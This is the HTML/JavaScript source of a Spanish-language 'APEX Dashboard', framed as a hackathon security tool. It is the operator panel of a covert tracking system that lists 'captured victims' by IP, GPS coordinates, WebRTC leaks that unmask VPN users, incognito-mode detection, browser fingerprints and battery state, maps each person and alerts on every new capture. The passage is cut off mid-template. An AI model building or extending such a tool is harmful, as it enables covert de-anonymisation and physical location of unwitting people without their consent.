<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APEX Dashboard - An√°lisis de Seguridad</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 30px;
            background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
            border-radius: 15px;
            border: 2px solid #00ff88;
            box-shadow: 0 0 30px rgba(0,255,136,0.2);
        }

        .header h1 {
            font-size: 48px;
            background: linear-gradient(135deg, #00ff88, #00d4ff);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }

        .header p {
            color: #888;
            font-size: 16px;
        }

        .controls {
            margin-bottom: 25px;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            justify-content: center;
        }

        button {
            background: linear-gradient(135deg, #00ff88, #00d4ff);
            color: #0a0e27;
            border: none;
            padding: 14px 28px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 15px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,255,136,0.5);
        }

        button.danger {
            background: linear-gradient(135deg, #ff3333, #ff6b6b);
        }

        button.secondary {
            background: linear-gradient(135deg, #667eea, #764ba2);
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
            padding: 25px;
            border-radius: 12px;
            border: 1px solid #00ff8844;
            text-align: center;
            transition: all 0.3s;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            border-color: #00ff88;
            box-shadow: 0 8px 25px rgba(0,255,136,0.3);
        }

        .stat-card h3 {
            font-size: 14px;
            color: #00ff88;
            margin-bottom: 15px;
            text-transform: uppercase;
        }

        .stat-card .number {
            font-size: 36px;
            font-weight: bold;
            background: linear-gradient(135deg, #00ff88, #00d4ff);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        /* TABLA */
        .victims-table {
            background: #1a1f3a;
            padding: 25px;
            border-radius: 12px;
            border: 1px solid #00ff88;
            overflow-x: auto;
        }

        .victims-table h2 {
            margin-bottom: 20px;
            font-size: 28px;
            color: #00ff88;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }

        th, td {
            padding: 14px;
            text-align: left;
            border-bottom: 1px solid #333;
        }

        th {
            background: #0a0e27;
            color: #00ff88;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 12px;
        }

        tr:hover {
            background: #2a2f4a;
        }

        .location-badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: bold;
        }

        .location-ip {
            background: #ff6b6b44;
            color: #ff6b6b;
        }

        .location-gps {
            background: #00ff8844;
            color: #00ff88;
        }

        .location-cache {
            background: #ffa50044;
            color: #ffa500;
        }

        .coords-link {
            color: #00d4ff;
            text-decoration: none;
            cursor: pointer;
        }

        .coords-link:hover {
            text-decoration: underline;
        }

        .vpn-badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: bold;
            background: #ff6b6b44;
            color: #ff6b6b;
            margin-left: 5px;
        }

        .incognito-badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: bold;
            background: #9b59b644;
            color: #9b59b6;
            margin-left: 5px;
        }

        .bot-badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: bold;
            background: #9b59b644;
            color: #9b59b6;
            margin-left: 5px;
        }

        .webrtc-leak {
            color: #ff6b6b;
            font-weight: bold;
        }

        .details-row {
            background: #0a0e27 !important;
            display: none;
        }

        .details-row.show {
            display: table-row;
        }

        .details-content {
            padding: 20px;
            border-left: 3px solid #00ff88;
        }

        .details-section {
            margin-bottom: 15px;
        }

        .details-section h4 {
            color: #00ff88;
            margin-bottom: 8px;
            font-size: 14px;
        }

        .details-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            font-size: 12px;
        }

        .detail-item {
            background: #1a1f3a;
            padding: 8px;
            border-radius: 4px;
        }

        .detail-label {
            color: #888;
            font-size: 10px;
            text-transform: uppercase;
        }

        .detail-value {
            color: #e0e0e0;
            margin-top: 3px;
        }

        tr.clickable {
            cursor: pointer;
        }

        tr.clickable:hover {
            background: #1a1f3a !important;
        }

        .loading {
            text-align: center;
            padding: 60px;
            font-size: 20px;
            color: #888;
        }

        .spinner {
            border: 4px solid rgba(0,255,136,0.3);
            border-top: 4px solid #00ff88;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Toast Notification */
        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #00ff88, #00d4ff);
            color: #0a0e27;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
            font-weight: bold;
            z-index: 10000;
            animation: slideIn 0.3s ease-out;
            min-width: 250px;
        }

        @keyframes slideIn {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        @keyframes slideOut {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(400px);
                opacity: 0;
            }
        }

        /* New Victim Highlight */
        .new-victim-highlight {
            animation: victimPulse 2s ease-out;
        }

        @keyframes victimPulse {
            0%, 100% {
                background: #13182e;
            }
            50% {
                background: #00ff8844;
                box-shadow: 0 0 20px rgba(0,255,136,0.3);
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>üéØ APEX DASHBOARD</h1>
        <p>Sistema de An√°lisis de Seguridad - Hackathon 2025</p>
    </div>

    <div class="controls">
        <button onclick="loadData()">üîÑ Actualizar</button>
        <button onclick="migrateData()" class="secondary">üîß Migrar Datos Antiguos</button>
        <button onclick="clearData()" class="danger">üóëÔ∏è Limpiar Datos</button>
        <button onclick="exportData()" class="secondary">üíæ Exportar JSON</button>
        <button onclick="exportCSV()" class="secondary">üìä Exportar CSV</button>
    </div>

    <div class="stats">
        <div class="stat-card">
            <h3>V√≠ctimas Totales</h3>
            <div class="number" id="totalVictims">0</div>
        </div>
        <div class="stat-card">
            <h3>Pa√≠ses √önicos</h3>
            <div class="number" id="uniqueCountries">0</div>
        </div>
        <div class="stat-card">
            <h3>Ubicaciones GPS</h3>
            <div class="number" id="gpsLocations">0</div>
        </div>
        <div class="stat-card">
            <h3>VPNs Detectadas</h3>
            <div class="number" id="vpnCount">0</div>
        </div>
        <div class="stat-card">
            <h3>Bots Detectados</h3>
            <div class="number" id="botCount">0</div>
        </div>
        <div class="stat-card">
            <h3>Modo Inc√≥gnito</h3>
            <div class="number" id="incognitoCount">0</div>
        </div>
        <div class="stat-card">
            <h3>√öltima Captura</h3>
            <div class="number" id="lastCapture" style="font-size: 16px;">-</div>
        </div>
    </div>

    <!-- TABLA DE V√çCTIMAS -->
    <!-- MAPA INTERACTIVO -->
    <div class="victims-table" style="margin-bottom: 30px;">
        <h2>üó∫Ô∏è Mapa de Ubicaciones</h2>
        <div id="mapContainer" style="height: 500px; border-radius: 8px; overflow: hidden; background: #1a1f3a;">
            <div id="map" style="height: 100%; width: 100%;"></div>
        </div>
    </div>

    <!-- GR√ÅFICOS -->
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; margin-bottom: 30px;">
        <div class="victims-table">
            <h2>üìä Distribuci√≥n de Navegadores</h2>
            <canvas id="browsersChart" style="max-height: 300px;"></canvas>
        </div>
        <div class="victims-table">
            <h2>üíª Dispositivos por Tipo</h2>
            <canvas id="devicesChart" style="max-height: 300px;"></canvas>
        </div>
    </div>

    <div class="victims-table">
        <h2>üìã Registro de V√≠ctimas</h2>
        <div id="tableContainer" class="loading">
            <div class="spinner"></div>
            <p>Cargando datos...</p>
        </div>
    </div>

    <!-- Leaflet CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <!-- Chart.js -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <script>
        let victimsData = [];
        let lastDataHash = '';
        let previousVictimCount = 0;
        let newVictimIds = new Set();
        let map = null;
        let markers = [];
        let browsersChart = null;
        let devicesChart = null;

        // Mostrar notificaci√≥n toast
        function showToast(message, duration = 3000) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = message;
            document.body.appendChild(toast);

            setTimeout(() => {
                toast.style.animation = 'slideOut 0.3s ease-out';
                setTimeout(() => {
                    document.body.removeChild(toast);
                }, 300);
            }, duration);
        }

        // Inicializar mapa
        function initMap() {
            if (!map) {
                map = L.map('map').setView([20, 0], 2);

                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
                    maxZoom: 19
                }).addTo(map);
            }
        }

        // Actualizar marcadores en el mapa
        function updateMap() {
            // Limpiar marcadores anteriores
            markers.forEach(marker => map.removeLayer(marker));
            markers = [];

            // Agregar marcadores para cada v√≠ctima con geolocalizaci√≥n
            victimsData.forEach(victim => {
                let lat, lon, source;

                // Priorizar GPS sobre IP
                if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
                    lat = victim.geolocation.latitude;
                    lon = victim.geolocation.longitude;
                    source = 'GPS';
                } else if (victim.network?.latitude && victim.network?.longitude) {
                    lat = victim.network.latitude;
                    lon = victim.network.longitude;
                    source = 'IP';
                } else {
                    return; // Sin coordenadas
                }

                // Color seg√∫n fuente
                const color = source === 'GPS' ? '#00ff88' : '#ff6b6b';

                // Crear marcador personalizado
                const marker = L.circleMarker([lat, lon], {
                    radius: 8,
                    fillColor: color,
                    color: '#fff',
                    weight: 2,
                    opacity: 1,
                    fillOpacity: 0.8
                }).addTo(map);

                // Popup con informaci√≥n
                const vpnBadge = victim.network?.vpnDetection?.likelyVPN ?
                    `<span style="background: #ff6b6b; padding: 2px 6px; border-radius: 3px; font-size: 10px;">VPN</span>` : '';

                marker.bindPopup(`
                    <div style="color: #000; font-family: Arial, sans-serif;">
                        <strong style="font-size: 14px;">${victim.username || 'Visitor'}</strong> ${vpnBadge}<br>
                        <strong>IP:</strong> ${victim.network?.ip || 'N/A'}<br>
                        <strong>Ubicaci√≥n:</strong> ${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}<br>
                        <strong>Fuente:</strong> ${source}<br>
                        <strong>Dispositivo:</strong> ${victim.device?.type || 'Unknown'}<br>
                        <strong>Navegador:</strong> ${victim.browser?.name || 'Unknown'}<br>
                        <strong>Fecha:</strong> ${new Date(victim.timestamp).toLocaleString('es-MX')}
                    </div>
                `);

                markers.push(marker);
            });

            // Ajustar vista si hay marcadores
            if (markers.length > 0) {
                const group = L.featureGroup(markers);
                map.fitBounds(group.getBounds().pad(0.1));
            }
        }

        // Inicializar gr√°ficos
        function initCharts() {
            // Gr√°fico de navegadores
            const browsersCtx = document.getElementById('browsersChart');
            if (browsersCtx && !browsersChart) {
                browsersChart = new Chart(browsersCtx, {
                    type: 'doughnut',
                    data: {
                        labels: [],
                        datasets: [{
                            data: [],
                            backgroundColor: [
                                '#00ff88', '#00d4ff', '#667eea', '#764ba2',
                                '#f093fb', '#4facfe', '#43e97b', '#fa709a'
                            ],
                            borderWidth: 2,
                            borderColor: '#0a0e27'
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: true,
                        plugins: {
                            legend: {
                                position: 'bottom',
                                labels: { color: '#e0e0e0', font: { size: 12 } }
                            }
                        }
                    }
                });
            }

            // Gr√°fico de dispositivos
            const devicesCtx = document.getElementById('devicesChart');
            if (devicesCtx && !devicesChart) {
                devicesChart = new Chart(devicesCtx, {
                    type: 'bar',
                    data: {
                        labels: [],
                        datasets: [{
                            label: 'Dispositivos',
                            data: [],
                            backgroundColor: '#00ff88',
                            borderColor: '#00ff88',
                            borderWidth: 2
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: true,
                        plugins: {
                            legend: { display: false }
                        },
                        scales: {
                            y: {
                                beginAtZero: true,
                                ticks: { color: '#e0e0e0', stepSize: 1 },
                                grid: { color: '#2a2f4a' }
                            },
                            x: {
                                ticks: { color: '#e0e0e0' },
                                grid: { color: '#2a2f4a' }
                            }
                        }
                    }
                });
            }
        }

        // Actualizar gr√°ficos
        function updateCharts() {
            if (!browsersChart || !devicesChart) return;

            // Contar navegadores
            const browsers = {};
            victimsData.forEach(v => {
                const browser = v.browser?.name || 'Unknown';
                browsers[browser] = (browsers[browser] || 0) + 1;
            });

            // Actualizar gr√°fico de navegadores
            browsersChart.data.labels = Object.keys(browsers);
            browsersChart.data.datasets[0].data = Object.values(browsers);
            browsersChart.update();

            // Contar dispositivos
            const devices = {};
            victimsData.forEach(v => {
                const device = v.device?.type || 'Unknown';
                devices[device] = (devices[device] || 0) + 1;
            });

            // Actualizar gr√°fico de dispositivos
            devicesChart.data.labels = Object.keys(devices);
            devicesChart.data.datasets[0].data = Object.values(devices);
            devicesChart.update();
        }

        // Cargar datos
        async function loadData() {
            try {
                const response = await fetch('/api/victims');
                const newData = await response.json();

                // Crear hash simple de los datos para detectar cambios
                const newHash = JSON.stringify(newData);

                // Solo actualizar si los datos cambiaron
                if (newHash !== lastDataHash) {
                    // Detectar nuevas v√≠ctimas
                    const currentCount = newData.length;
                    if (previousVictimCount > 0 && currentCount > previousVictimCount) {
                        const newVictimCount = currentCount - previousVictimCount;
                        const latestVictim = newData[newData.length - 1];
                        const location = `${latestVictim.network?.city || 'Unknown'}, ${latestVictim.network?.country || 'Unknown'}`;

                        // Mostrar notificaci√≥n
                        showToast(`üéØ Nueva v√≠ctima capturada! (${location})`);

                        // Marcar las nuevas v√≠ctimas para highlight
                        newVictimIds.clear();
                        for (let i = previousVictimCount; i < currentCount; i++) {
                            newVictimIds.add(`victim-${currentCount - i}`);
                        }
                    }

                    previousVictimCount = currentCount;
                    victimsData = newData;
                    lastDataHash = newHash;

                    updateStats();
                    renderTable();
                    updateMap();
                    updateCharts();
                } else {
                    // Solo actualizar estad√≠sticas (tiempo relativo)
                    updateStats();
                }

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('tableContainer').innerHTML =
                    '<p class="loading">‚ùå Error al cargar datos</p>';
            }
        }

        function updateStats() {
            document.getElementById('totalVictims').textContent = victimsData.length;

            const uniqueCountries = [...new Set(victimsData.map(v => v.network?.country || 'Unknown'))];
            document.getElementById('uniqueCountries').textContent = uniqueCountries.length;

            const gpsCount = victimsData.filter(v => v.geolocation?.latitude).length;
            document.getElementById('gpsLocations').textContent = gpsCount;

            // ‚úÖ NUEVAS ESTAD√çSTICAS
            const vpnCount = victimsData.filter(v => v.network?.vpnDetection?.likelyVPN).length;
            document.getElementById('vpnCount').textContent = vpnCount;

            const botCount = victimsData.filter(v => v.device?.isBot).length;
            document.getElementById('botCount').textContent = botCount;

            const incognitoCount = victimsData.filter(v => v.incognitoMode?.isIncognito).length;
            document.getElementById('incognitoCount').textContent = incognitoCount;

            if (victimsData.length > 0) {
                const lastVictim = victimsData[victimsData.length - 1];
                const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
                document.getElementById('lastCapture').textContent = timeAgo;
            }
        }

        function renderTable() {
            if (victimsData.length === 0) {
                document.getElementById('tableContainer').innerHTML =
                    '<p class="loading">No hay v√≠ctimas capturadas a√∫n.</p>';
                return;
            }

            let tableHTML = `
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Usuario</th>
                            <th>IP / WebRTC</th>
                            <th>Ubicaci√≥n</th>
                            <th>Coordenadas</th>
                            <th>Dispositivo</th>
                            <th>Navegador</th>
                            <th>Fecha</th>
                        </tr>
                    </thead>
                    <tbody>
            `;

            const reversedVictims = [...victimsData].reverse();
            reversedVictims.forEach((victim, index) => {
                const hasGPS = victim.geolocation?.latitude && victim.geolocation?.longitude;

                // Determinar badge de ubicaci√≥n
                let locationBadge = '';
                const locationSource = victim.network?.locationSource;
                if (locationSource === 'gps') {
                    locationBadge = '<span class="location-badge location-gps">GPS</span>';
                } else if (locationSource === 'ipapi') {
                    locationBadge = '<span class="location-badge location-ip">IP</span>';
                } else if (victim.network?.fromCache) {
                    locationBadge = '<span class="location-badge location-cache">CACHE</span>';
                } else {
                    locationBadge = '<span class="location-badge location-ip">IP</span>';
                }

                // Coordenadas
                let coordsHTML = 'N/A';
                if (hasGPS) {
                    const lat = victim.geolocation.latitude.toFixed(4);
                    const lon = victim.geolocation.longitude.toFixed(4);
                    const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    coordsHTML = `<a href="${googleMapsUrl}" target="_blank" class="coords-link">${lat}, ${lon}</a>`;
                }

                // IP y WebRTC
                let ipHTML = victim.network?.ip || 'Unknown';
                if (victim.webRTC?.publicIP && victim.webRTC.publicIP !== 'Unknown' && victim.webRTC.publicIP !== victim.network?.ip) {
                    ipHTML += `<br><span class="webrtc-leak" title="WebRTC Leak">üî¥ ${victim.webRTC.publicIP}</span>`;
                }

                // Navegador con badge de inc√≥gnito
                let browserHTML = `${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}`;
                if (victim.incognitoMode?.isIncognito) {
                    const confidence = victim.incognitoMode.confidence || 'low';
                    const confidenceEmoji = {
                        'high': 'üî¥',
                        'medium': 'üü°',
                        'low': 'üü¢'
                    };
                    const emoji = confidenceEmoji[confidence] || 'üïµÔ∏è';
                    browserHTML += `<span class="incognito-badge" title="Inc√≥gnito - Confianza: ${confidence}">${emoji} INC√ìGNITO</span>`;
                }

                // Dispositivo con badges
                let deviceHTML = `${victim.device?.type || 'Unknown'} - ${victim.os?.name || 'Unknown'}`;
                if (victim.device?.isBot) {
                    deviceHTML += '<span class="bot-badge">BOT</span>';
                }

                // Ubicaci√≥n con VPN badge
                let locationHTML = `${locationBadge} ${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}`;
                if (victim.network?.vpnDetection?.likelyVPN) {
                    const confidence = victim.network.vpnDetection.confidence || 'low';
                    const confidenceEmoji = {
                        'high': 'üî¥',
                        'medium': 'üü°',
                        'low': 'üü¢'
                    };
                    const emoji = confidenceEmoji[confidence] || 'üî¥';
                    locationHTML += `<span class="vpn-badge" title="VPN Confianza: ${confidence}">${emoji} VPN</span>`;
                }

                const date = new Date(victim.timestamp).toLocaleString('es-MX');
                const victimId = `victim-${victimsData.length - index}`;

                // Agregar clase de highlight si es v√≠ctima nueva
                const highlightClass = newVictimIds.has(victimId) ? ' new-victim-highlight' : '';

                tableHTML += `
                    <tr class="clickable${highlightClass}" onclick="toggleDetails('${victimId}')">
                        <td>${victimsData.length - index}</td>
                        <td><strong>${victim.username || 'Visitor'}</strong></td>
                        <td>${ipHTML}</td>
                        <td>${locationHTML}</td>
                        <td>${coordsHTML}</td>
                        <td>${deviceHTML}</td>
                        <td>${browserHTML}</td>
                        <td>${date}</td>
                    </tr>
                    <tr class="details-row" id="details-${victimId}">
                        <td colspan="8">
                            ${generateDetailsHTML(victim)}
                        </td>
                    </tr>
                `;
            });

            tableHTML += '</tbody></table>';
            document.getElementById('tableContainer').innerHTML = tableHTML;
        }

        function toggleDetails(victimId) {
            const detailsRow = document.getElementById('details-' + victimId);
            if (detailsRow) {
                detailsRow.classList.toggle('show');
            }
        }

        function generateDetailsHTML(victim) {
            let html = '<div class="details-content">';

            // VPN Detection
            if (victim.network?.vpnDetection) {
                const vpn = victim.network.vpnDetection;
                const confidenceColor = {
                    'high': '#ff6b6b',
                    'medium': '#ffa500',
                    'low': '#4CAF50'
                };
                const color = confidenceColor[vpn.confidence] || '#888';

                html += `
                    <div class="details-section">
                        <h4>üõ°Ô∏è Detecci√≥n de VPN/Proxy</h4>
                        <div class="details-grid">
                            <div class="detail-item">
                                <div class="detail-label">Probable VPN</div>
                                <div class="detail-value">${vpn.likelyVPN ? '‚ö†Ô∏è S√ç' : '‚úÖ NO'}</div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">Confianza</div>
                                <div class="detail-value" style="color: ${color}; font-weight: bold; text-transform: uppercase;">${vpn.confidence || 'low'}</div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">Timezone Mismatch</div>
                                <div class="detail-value">${vpn.timezoneMismatch ? '‚ö†Ô∏è S√≠' : 'No'}</div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">WebRTC Leak</div>
                                <div class="detail-value">${vpn.webRTCLeak ? '‚ö†Ô∏è S√≠' : 'No'}</div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">ISP Sospechoso</div>
                                <div class="detail-value">${vpn.suspiciousISP ? '‚ö†Ô∏è S√≠' : 'No'}</div>
                            </div>
                        </div>
                    </div>
                `;
            }

            // WebRTC Info
            if (victim.webRTC) {
                html += `
                    <div class="details-section">
                        <h4>üåê WebRTC Information</h4>
                        <div class="details-grid">
                            <div class="detail-item">
                                <div class="detail-label">IP Local</div>
                                <div class="detail-value">${victim.webRTC.localIP || 'N/A'}</div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">IP P√∫blica (WebRTC)</div>
                                <div class="detail-value">${victim.webRTC.publicIP || 'N/A'}</div>
                            </div>
                            ${victim.webRTC.allIPs ? `
                                <div class="detail-item" style="grid-column: span 2;">
                                    <div class="detail-label">Todas las IPs</div>
                                    <div class="detail-value">${victim.webRTC.allIPs.join(', ')}</div>
                                </div>
                            ` : ''}
                        </div>
                    </div>
                `;
            }

            // Incognito Mode Detection
            if (victim.incognitoMode) {
                const confidenceColor = {
                    'high': '#ff6b6b',
                    'medium': '#ffd93d',
                    'low': '#6bcf7f'
                };
                const color = confidenceColor[victim.incognitoMode.confidence] || '#888';

                let methodsHTML = '';
                if (victim.incognitoMode.methods && victim.incognitoMode.methods.length > 0) {
                    methodsHTML = victim.incognitoMode.methods.map(m =>
                        `<span style="background: rgba(255,107,107,0.15); padding: 4px 10px; border-radius: 4px; margin: 2px; display: inline-block; font-size: 12px;">${m}</span>`
                    ).join('');
                } else if (victim.incognitoMode.method) {
                    methodsHTML = `<span style="background: rgba(255,107,107,0.15); padding: 4px 10px; border-radius: 4px;">${victim.incognitoMode.method}</span>`;
                } else {
                    methodsHTML = 'N/A';
                }

                // Tests realizados
                let testsHTML = '';
                if (victim.incognitoMode.tests) {
                    const tests = victim.incognitoMode.tests;
                    testsHTML = '<div style="margin-top: 15px; padding: 12px; background: rgba(0,0,0,0.03); border-radius: 6px; border-left: 3px solid #ff6b6b;">';
                    testsHTML += '<strong style="color: #333; font-size: 13px;">üìã Tests Realizados:</strong><br><div style="margin-top: 8px; font-size: 12px; line-height: 1.8;">';

                    if (tests.storageQuota) {
                        const quota = tests.storageQuota.quota;
                        const quotaMB = quota ? (quota / 1024 / 1024).toFixed(2) + ' MB' : 'N/A';
                        const limited = tests.storageQuota.quotaLimited ? '<span style="color: #ff4444; font-weight: bold;">‚ö†Ô∏è LIMITADO</span>' : '<span style="color: #4CAF50;">‚úÖ Normal</span>';
                        testsHTML += `üì¶ <strong>Storage Quota:</strong> ${quotaMB} ${limited}<br>`;
                    }
                    if (tests.localStorage) {
                        const status = tests.localStorage.available ? '<span style="color: #4CAF50;">‚úÖ Disponible</span>' : '<span style="color: #ff4444; font-weight: bold;">üîí Bloqueado</span>';
                        testsHTML += `üíæ <strong>LocalStorage:</strong> ${status}<br>`;
                    }
                    if (tests.indexedDB) {
                        const status = tests.indexedDB.available ? '<span style="color: #4CAF50;">‚úÖ Disponible</span>' : '<span style="color: #ff9800;">üîí No disponible</span>';
                        testsHTML += `üóÑÔ∏è <strong>IndexedDB:</strong> ${status}<br>`;
                    }
                    if (tests.fileSystem) {
                        const status = tests.fileSystem.blocked ? '<span style="color: #ff4444; font-weight: bold;">üîí Bloqueado</span>' : '<span style="color: #4CAF50;">‚úÖ Disponible</span>';
                        testsHTML += `üìÅ <strong>FileSystem API:</strong> ${status}<br>`;
                    }
                    if (tests.serviceWorker !== undefined) {
                        const status = tests.serviceWorker.available ? '<span style="color: #4CAF50;">‚úÖ Disponible</span>' : '<span style="color: #ff9800;">üîí No disponible</span>';
                        testsHTML += `‚öôÔ∏è <strong>Service Worker:</strong> ${status}<br>`;
                    }
                    if (tests.storageRatio) {
                        testsHTML += `üî¢ <strong>Storage Items:</strong> Session=${tests.storageRatio.sessionItems}, Local=${tests.storageRatio.localItems}<br>`;
                    }

                    testsHTML += '</div></div>';
                }

                html += `
                    <div class="details-section">
                        <h4>üïµÔ∏è Detecci√≥n de Modo Inc√≥gnito/Privado</h4>
                        <div class="details-grid">
                            <div class="detail-item">
                                <div class="detail-label">Modo Inc√≥gnito</div>
                                <div class="detail-value" style="color: ${victim.incognitoMode.isIncognito ? '#ff4444' : '#4CAF50'}; font-weight: bold; font-size: 16px;">
                                    ${victim.incognitoMode.isIncognito ? '‚ö†Ô∏è S√ç DETECTADO' : '‚úÖ NO'}
                                </div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">Confianza</div>
                                <div class="detail-value" style="color: ${color}; font-weight: bold; text-transform: uppercase; font-size: 14px;">
                                    ${victim.incognitoMode.confidence || 'N/A'}
                                </div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">Indicadores</div>
                                <div class="detail-value" style="font-weight: bold; font-size: 18px; color: ${victim.incognitoMode.indicators >= 3 ? '#ff4444' : '#666'};">
                                    ${victim.incognitoMode.indicators || 0}
                                </div>
                            </div>
                        </div>
                        <div style="margin-top: 15px;">
                            <div class="detail-label" style="margin-bottom: 8px;">M√©todos de Detecci√≥n:</div>
                            <div>${methodsHTML}</div>
                        </div>
                        ${testsHTML}
                    </div>
                `;
            }

            // Fingerprints
            if (victim.fingerprints) {
                html += `
                    <div class="details-section">
                        <h4>üîç Fingerprints</h4>
                        <div class="details-grid">
                            <div class="detail-item">
                                <div class="detail-label">Canvas</div>
                                <div class="detail-value">${victim.fingerprints.canvas?.substring(0, 20) || 'N/A'}...</div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">WebGL Renderer</div>
                                <div class="detail-value">${victim.fingerprints.webglRenderer || 'N/A'}</div>
                            </div>
                            ${victim.fingerprints.audio ? `
                                <div class="detail-item">
                                    <div class="detail-label">Audio Hash</div>
                                    <div class="detail-value">${victim.fingerprints.audio.hash || 'N/A'}</div>
                                </div>
                                <div class="detail-item">
                                    <div class="detail-label">Audio Sample Rate</div>
                                    <div class="detail-value">${victim.fingerprints.audio.sampleRate || 'N/A'} Hz</div>
                                </div>
                            ` : ''}
                        </div>
                    </div>
                `;
            }

            // Device & Hardware
            html += `
                <div class="details-section">
                    <h4>üíª Dispositivo & Hardware</h4>
                    <div class="details-grid">
                        <div class="detail-item">
                            <div class="detail-label">Tipo</div>
                            <div class="detail-value">${victim.device?.type || 'Unknown'}</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">CPU Cores</div>
                            <div class="detail-value">${victim.device?.cpuCores || 'N/A'}</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Memoria</div>
                            <div class="detail-value">${victim.device?.memory || 'N/A'}</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Bot</div>
                            <div class="detail-value">${victim.device?.isBot ? '‚ö†Ô∏è S√≠' : 'No'}</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Headless</div>
                            <div class="detail-value">${victim.device?.isHeadless ? '‚ö†Ô∏è S√≠' : 'No'}</div>
                        </div>
                    </div>
                </div>
            `;

            // Battery Status
            if (victim.battery) {
                html += `
                    <div class="details-section">
                        <h4>üîã Estado de Bater√≠a</h4>
                        <div class="details-grid">
                            <div class="detail-item">
                                <div class="detail-label">Nivel</div>
                                <div class="detail-value" style="font-weight: bold; color: ${
                                    victim.battery.level === 'Unknown' ? '#888' :
                                    parseInt(victim.battery.level) > 50 ? '#4CAF50' :
                                    parseInt(victim.battery.level) > 20 ? '#ffa500' : '#ff6b6b'
                                };">
                                    ${victim.battery.level || 'N/A'}
                                </div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">Cargando</div>
                                <div class="detail-value">${victim.battery.charging ? 'üîå S√ç' : 'üì± NO'}</div>
                            </div>
                            ${victim.battery.chargingTime && victim.battery.chargingTime !== 'N/A' ? `
                                <div class="detail-item">
                                    <div class="detail-label">Tiempo de Carga</div>
                                    <div class="detail-value">${victim.battery.chargingTime}</div>
                                </div>
                            ` : ''}
                            ${victim.battery.dischargingTime && victim.battery.dischargingTime !== 'N/A' ? `
                                <div class="detail-item">
                                    <div class="detail-label">Tiempo Restante</div>
                                    <div class="detail-value">${victim.battery.dischargingTime}</div>
                                </div>
                            ` : ''}
                        </div>
                    </div>
                `;
            }

            // Timezone & Location
            if (victim.timezoneInfo) {
                html += `
                    <div class="details-section">
                        <h4>üïê Timezone & Locale</h4>
                        <div class="details-grid">
                            <div class="detail-item">
                                <div class="detail-label">Timezone</div>
